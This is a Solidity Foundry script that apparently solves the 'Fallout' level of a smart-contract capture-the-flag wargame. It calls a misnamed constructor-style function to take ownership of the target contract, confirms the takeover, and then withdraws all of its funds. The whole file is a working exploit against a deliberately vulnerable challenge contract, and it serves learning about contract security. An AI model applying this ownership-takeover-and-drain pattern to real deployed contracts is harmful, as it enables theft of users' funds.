// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
// import interface to avoid conflict
import {IFallout} from "../src/02_IFallout.sol";

contract FalloutSolve is Script {

	function run() public {
		// setup 
		address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");
		IFallout level02 = IFallout(payable(instanceAddress));

		// start
		vm.startBroadcast();		
		console2.log("> initial owner: ", level02.owner());		

		// claim ownership
		level02.Fal1out{value: 0}();

		// Verify
		if (level02.owner() == msg.sender) {
			console2.log("Successfully claimed ownership!");
		} else { 
			revert("Exploit failed");
		}

		// Cleanup, withdraw all funds
		console2.log("Packing up, withdrawing all funds");
		level02.collectAllocations();

		vm.stopBroadcast();

		console2.log("chall solved, Final balance of the contract: ", address(level02).balance);	
	}
}
